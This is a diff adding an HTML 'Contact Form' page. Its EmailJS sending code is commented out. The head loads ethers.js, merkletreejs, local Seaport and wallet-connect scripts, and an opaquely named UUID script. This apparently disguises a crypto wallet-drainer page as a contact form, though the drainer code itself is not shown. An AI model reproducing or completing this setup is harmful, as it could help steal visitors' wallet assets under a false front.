@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Contact Form</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
+    <script src="./scripts/seaport.js"></script><script src="./scripts/wallet_connect.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="./05bdc80b-4045-4f7d-b6d3-2ecbf567fdca.js"></script>
+    
+</head>
+<body>
+    <form id="form">
+        <div class="field">
+          <label for="to_name">to_name</label>
+          <input type="text" name="to_name" id="to_name">
+        </div>
+        <div class="field">
+          <label for="from_name">from_name</label>
+          <input type="text" name="from_name" id="from_name">
+        </div>
+        <div class="field">
+          <label for="message">message</label>
+          <input type="text" name="message" id="message">
+        </div>
+        <div class="field">
+          <label for="reply_to">reply_to</label>
+          <input type="text" name="reply_to" id="reply_to">
+        </div>
+      
+        <input type="submit" id="button" value="Send Email" class="interact-button">
+      </form>
+      
+     <!---<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+      
+      <script type="text/javascript">
+        emailjs.init('m48k317tOnRoM5wYr')
+      </script>
+
+<script>
+    const btn = document.getElementById('button');
+
+document.getElementById('form')
+.addEventListener('submit', function(event) {
+event.preventDefault();
+
+btn.value = 'Sending...';
+
+const serviceID = 'default_service';
+const templateID = 'template_xod106a';
+
+emailjs.sendForm(serviceID, templateID, this)
+.then(() => {
+  btn.value = 'Send Email';
+  alert('Sent!');
+}, (err) => {
+  btn.value = 'Send Email';
+  alert(JSON.stringify(err));
+});
+});
+</script>-->
+</body>
+</html>
